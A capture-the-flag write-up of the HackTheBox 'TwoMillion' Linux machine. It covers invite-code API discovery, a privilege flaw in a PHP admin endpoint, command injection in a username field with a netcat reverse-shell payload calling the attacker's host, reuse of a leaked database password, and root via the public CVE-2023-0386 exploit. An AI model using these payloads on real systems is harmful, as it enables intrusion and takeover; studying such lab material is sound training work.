---
description: >-
  TwoMillion is an Easy difficulty Linux box that was released to celebrate
  reaching 2 million users on HackTheBox
cover: ../../../.gitbook/assets/graph.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# TwoMillion

## Information

<table data-header-hidden><thead><tr><th width="330">Name</th><th align="right"></th></tr></thead><tbody><tr><td>Name</td><td align="right"><img src="../../../.gitbook/assets/twomillion.png" alt="https://www.hackthebox.com/machines/twomillion"></td></tr><tr><td>Release Date </td><td align="right">7 Jun 2023</td></tr><tr><td>OS</td><td align="right">Linux</td></tr><tr><td>Difficulty</td><td align="right">Easy</td></tr><tr><td>Vulnerabilities</td><td align="right"><p>Remote Code Execution, Misconfiguration,</p><p> OS Command Injection, Command Execution</p></td></tr><tr><td>Languages</td><td align="right">PHP, JavaScript</td></tr></tbody></table>

## Enumeration

### Nmap

{% code overflow="wrap" fullWidth="false" %}
```apacheconf
msplmee@kali:~$ nmap -p- --min-rate 10000 10.10.11.221
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 02:34 EDT
Nmap scan report for 10.10.11.221
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.67 seconds
                                                                                                                                                                                             
msplmee@kali:~$ nmap -p 22,80 -sC -sV 10.10.11.221
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-08 02:35 EDT
Nmap scan report for 10.10.11.221
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
```
{% endcode %}

The scan reveals ports 22 (SSH) and 80 (Nginx) open.&#x20;

### Subdomain Brute Force

I will try to brute force the DNS server named "2million.htb" with ffuf to check if there are any different subdomains. However, it doesn't return any results.

So let's add this vHost to /etc/hosts file.

```bash
echo '10.10.11.221 2million.htb' | sudo tee -a /etc/hosts
```

### Website - TCP 80

<figure><img src="../../../.gitbook/assets/2million.png" alt=""><figcaption></figcaption></figure>

Most of the links direct to various locations on the page. The website has functionality to login and join the platform.&#x20;

The link labeled `/login` shows a login form. However, since I don't have any credentials and the "forgot password" link doesn't lead anywhere, there's nothing for me here.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

When I click on join and then select `Join HTB`, I get redirected to `/invite`. This page asks for an invite code, with a message that says "Feel free to hack your way in :)".&#x20;

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The Invite Code Challenge was back :tada::tada::tada:

## Shell as www-data

### Invite Code Challenge

Taking a look at the page's source code I see the following.

{% code overflow="wrap" %}
```javascript
<script defer src="/js/inviteapi.min.js"></script>
<script defer>
    $(document).ready(function() {
        $('#verifyForm').submit(function(e) {
            e.preventDefault();

            var code = $('#code').val();
            var formData = { "code": code };

            $.ajax({
                type: "POST",
                dataType: "json",
                data: formData,
                url: '/api/v1/invite/verify',
                success: function(response) {
                    if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                        // Store the invite code in localStorage
                        localStorage.setItem('inviteCode', code);

                        window.location.href = '/register';
                    } else {
                        alert("Invalid invite code. Please try again.");
                    }
                },
                error: function(response) {
                    alert("An error occurred. Please try again.");
                }
            });
        });
    });
</script>
```
{% endcode %}

When the form submits, it sends a POST request to `/api/v1/invite/verify` to check the validity of the provided code. Additionally, a script named `inviteapi.min.js` is being loaded:

{% code overflow="wrap" %}
```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```
{% endcode %}

Let's de-obfuscating this code with [de4js](https://lelinhtinh.github.io/de4js/). I get the following readable JavaScript code.

{% code overflow="wrap" %}
```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```
{% endcode %}

There are two functions in the code above. The `makeInviteCode` is more interesting, as it can make a POST request to `/api/v1/invite/how/to/generate`.&#x20;

{% code overflow="wrap" %}
```apacheconf
msplmee@kali:~$ curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq  
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```
{% endcode %}

The hint says the data is encrypted, and the `encytpe` says it’s ROT13. The website [rot13 ](https://rot13.com/)can be used to decrypt the above data.

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Let's generate an invite code.

```apacheconf
msplmee@kali:~$ curl -sX POST http://2million.htb/api/v1/invite/generate | jq       
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "MDVUVkEtRlcyOFctMVlSRVAtQjdTUFY=",
    "format": "encoded"
  }
}
```

The result says the format is "encoded". The "code" is all numbers, letters and ends with `=`. That fits base64 encoding nicely.

```apacheconf
msplmee@kali:~$ echo MDVUVkEtRlcyOFctMVlSRVAtQjdTUFY= | base64 -d 
05TVA-FW28W-1YREP-B7SPV
```

That looks like a valid invite code. When I enter it into the form on `/invite`, it redirects me to `/register`. I can sign up here and log in.

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Authenticated Enumeration

With an account, I can access to `/home`

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

The only link that really works is the "Access" page `/home/access`

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

The Access page allows a user to Download and Regenerate VPN file to be able to access the HTB infrastructure.

"Connection Pack" is sent out to `/api/v1/users/vpn/generate` and in return the VPN file and in return the VPN file for current user is downloaded.

I will send one of these requests to Burp Repeater and try request to the URL `/api`

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Let's request `/api/v1` . It returns details of the full API

{% code overflow="wrap" %}
```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```
{% endcode %}

Let's enumerate Admin API

`/admin/auth`: I'm not an admin

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

`/admin/vpn/generate`: it returns 401 Unauthorized

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

`/admin/settings/update`: it doesn't return 401 Unauthorized, but instead the API replies with `Invalid content type`

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### Get Admin Access

It is often for APIs to use JSON for sending and receiving data, so lets set the `Content-Type` header to `application/json`

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

I get new error message; I will add `email` in the body in json

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

I get another error for a missing parameter called `is_admin`. I will add this as well.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

I verify this again by accessing the `/admin/auth`

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### Command Injection

Let's check out the `/admin/vpn/generate` URL that I have sufficient permissions.

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

I will add my username

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

If this VPN is created using the exec or system PHP function and lacks proper filtering - which is likely since it's an administrative-only feature - there's a chance that injecting code into the username field could lead to gaining command execution on the remote system.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

The command is successful and I gain command execution. Let's get reverse shell.

{% code overflow="wrap" %}
```json
{
	"username": "msplmee; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.22 443 >/tmp/f;"
}
```
{% endcode %}

On sending this, I get a shell at my `pwn-cat`

{% code overflow="wrap" %}
```apacheconf
msplmee@kali:~$ pwncat-cs -l -p 443                              
[06:28:52] Welcome to pwncat 🐈!                                                                                                                                              
[06:33:38] received connection from 10.10.11.221:38618                                                                                                                             
[06:33:39] 10.10.11.221:38618: registered new host w/ db                                                                                                                       
(local) pwncat$                                                                                                                                                                              
(remote) www-data@2million:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}

## Shell as admin

The web directory has a file named `.env` that holds the database login details for a user named `admin`.

```apacheconf
www-data@2million:/var/www/html$ cat .env 
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Due to the reuse of passwords, I can log in as the admin via `su` or SSH. The user flag can be found in `/home/admin`

{% code overflow="wrap" %}
```apacheconf
msplmee@kali:~$ pwncat-cs ssh://admin:SuperDuperPass123@2million.htb
[06:45:18] Welcome to pwncat 🐈!                                                                                                                                              
[06:45:21] 2million.htb:22: registered new host w/ db                                                                                                                      
(local) pwncat$                                                                                                                                                                              
(remote) admin@2million:/home/admin$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
(remote) admin@2million:/home/admin$ cat user.txt 
a4d*****************************
```
{% endcode %}

## Shell as root

After some effort, I found a mail file `/var/mail/admin` for the user admin.

{% code overflow="wrap" %}
```apacheconf
admin@2million:/$ cat /var/mail/admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
{% endcode %}

An exploit for `OverlayFS / FUSE` is mentioned. After quickly searching on Google, I discovered some articles about a vulnerability assigned `CVE-2023-0386`. These articles provide information about the kernel versions that are at risk.

Let's find out the current version of the kernel and the release of the box.

{% code overflow="wrap" %}
```apacheconf
admin@2million:/$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:/$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.2 LTS
Release:        22.04
Codename:       jammy
```
{% endcode %}

The affected kernel versions for `jammy` go up to `5.15.0-70.77` and as seen previously the box is using `5.15.70` so it is a good idea to test if it is vulnerable.

There’s a [POC for this exploit](https://github.com/xkaneiki/CVE-2023-0386) on GitHub. I download the ZIP version of the repo then upload it to 2million

```apacheconf
(local) pwncat$ upload CVE-2023-0386.zip /tmp/CVE-2023-0386.zip
```

Unzip the contents of CVE-2023-0386.zip, go into the folder and compile the code.

```apacheconf
admin@2million:/tmp$ unzip CVE-2023-0386.zip 
Archive:  CVE-2023-0386.zip
c4c65cefca1365c807c397e953d048506f3de195
   creating: CVE-2023-0386-main/
  inflating: CVE-2023-0386-main/Makefile  
  inflating: CVE-2023-0386-main/README.md  
  inflating: CVE-2023-0386-main/exp.c  
  inflating: CVE-2023-0386-main/fuse.c  
  inflating: CVE-2023-0386-main/getshell.c  
   creating: CVE-2023-0386-main/ovlcap/
 extracting: CVE-2023-0386-main/ovlcap/.gitkeep  
   creating: CVE-2023-0386-main/test/
  inflating: CVE-2023-0386-main/test/fuse_test.c  
  inflating: CVE-2023-0386-main/test/mnt  
  inflating: CVE-2023-0386-main/test/mnt.c
admin@2million:/tmp$ cd CVE-2023-0386-main/
admin@2million:/tmp/CVE-2023-0386-main$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
<SNIP>
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

Finally, let's run the next command from the instructions.

```apacheconf
admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
```

Then I execute the `exp` binary in the other window.

```apacheconf
admin@2million:/tmp/CVE-2023-0386-main$ ./exp 
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Aug  9 02:11 .
drwxrwxr-x 6 root   root     4096 Aug  9 02:11 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-main# 
```

That's a root shell. The root flag can be found in `/root/root.txt`

```apacheconf
root@2million:~# cat /root/root.txt 
897*****************************
```

## Post Root

There is a file `thank_you.json` in the root directory along with the flag.

```json
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

I use [CyberChef](https://gchq.github.io/CyberChef/) to decode this message.

URL Decode

```json
{"encoding": "url", "data": "{"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}"}
```

From Hex

```
{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}
```

Form Base64 and XOR. It's a thank you note.

{% code overflow="wrap" %}
```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```
{% endcode %}

## Code Analysic

### Update Settings

The first vulnerability that allows users to set themselves as admin lies in the `update_settings` function in `AdminController.php`.

```php
public function update_settings($router) {
    $db = Database::getDatabase();

    $is_admin = $this->is_admin($router);
    if (!$is_admin) {
        return header("HTTP/1.1 401 Unauthorized");
        exit;
    }

    if (!isset($_SERVER['CONTENT_TYPE']) || $_SERVER['CONTENT_TYPE'] !== 'application/json') {
        return json_encode([
            'status' => 'danger',
            'message' => 'Invalid content type.'
        ]);
        exit;
    }

    $body = file_get_contents('php://input');
    $json = json_decode($body);

    if (!isset($json->email)) {
        return json_encode([
            'status' => 'danger',
            'message' => 'Missing parameter: email'
        ]);
        exit;
    }

    if (!isset($json->is_admin)) {
        return json_encode([
            'status' => 'danger',
            'message' => 'Missing parameter: is_admin'
        ]);
        exit;
    }

    $email = $json->email;
    $is_admin = $json->is_admin;

    if ($is_admin !== 1 && $is_admin !== 0) {
        return json_encode([
            'status' => 'danger',
            'message' => 'Variable is_admin needs to be either 0 or 1.'
        ]);
        exit;
    }

    $stmt = $db->query('SELECT * FROM users WHERE email = ?', ['s' => [$email]]);
    $user = $stmt->fetch_assoc();

    if ($user) {
        $stmt = $db->query('UPDATE users SET is_admin = ? WHERE email = ?', ['s' => [$is_admin, $email]]);
    } else {
        return json_encode([
            'status' => 'danger',
            'message' => 'Email not found.'
        ]);
        exit;
    }

    if ($user['username'] == $_SESSION['username'] ) {
        $_SESSION['is_admin'] = $is_admin;
    }

    return json_encode(['id' => $user['id'], 'username' => $user['username'], 'is_admin' => $is_admin]);
}
```

In the above code the `is_admin` function is called to check if the current user is administrator or not.&#x20;

```php
public function is_admin($router)
{
    if (!isset($_SESSION) || !isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true || !isset($_SESSION['username'])) {
        return header("HTTP/1.1 401 Unauthorized");
        exit;
    }

    $db = Database::getDatabase();

    $stmt = $db->query('SELECT is_admin FROM users WHERE username = ?', ['s' => [$_SESSION['username']]]);
    $user = $stmt->fetch_assoc();

    if ($user['is_admin'] == 1) {
        header('Content-Type: application/json');
        return json_encode(['message' => TRUE]);
    } else {
        header('Content-Type: application/json');
        return json_encode(['message' => FALSE]);
    }
}
```

This function checks the current user session for the `username` and `is_admin` variables and also checks if the value of `is_admin` is equal to 1 at which point it returns JSON with `message` set to true.

The issue is that the `update_settings` function doesn't properly check the value of `is_admin`. It checks if `is_admin` exists and/or if its value is true, the `if` statement in the `update_setting` results to true because `is_admin` has a value.

### Admin VPN

The second vulnerability exists in the `VPNController.php` and specifically the `admin_vpn` function.

```php
public function admin_vpn($router) {
    if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
        return header("HTTP/1.1 401 Unauthorized");
        exit;
    }
    if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== 1) {
        return header("HTTP/1.1 401 Unauthorized");
        exit;
    }
    if (!isset($_SERVER['CONTENT_TYPE']) || $_SERVER['CONTENT_TYPE'] !== 'application/json') {
        return json_encode([
            'status' => 'danger',
            'message' => 'Invalid content type.'
        ]);
        exit;
    }

    $body = file_get_contents('php://input');
    $json = json_decode($body);

    if (!isset($json)) {
        return json_encode([
            'status' => 'danger',
            'message' => 'Missing parameter: username'
        ]);
        exit;
    }
    if (!$json->username) {
        return json_encode([
            'status' => 'danger',
                'message' => 'Missing parameter: username'
        ]);
        exit;
    }
    $username = $json->username;

    $this->regenerate_user_vpn($router, $username);
    $output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn");

    return is_array($output) ? implode("<br>", $output) : $output;
}
```

It uses a `shell_exec` to read and print the contents of the generated VPN file.

```php
$output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn");
```

Due to the username variable being used here a command injection is possible.
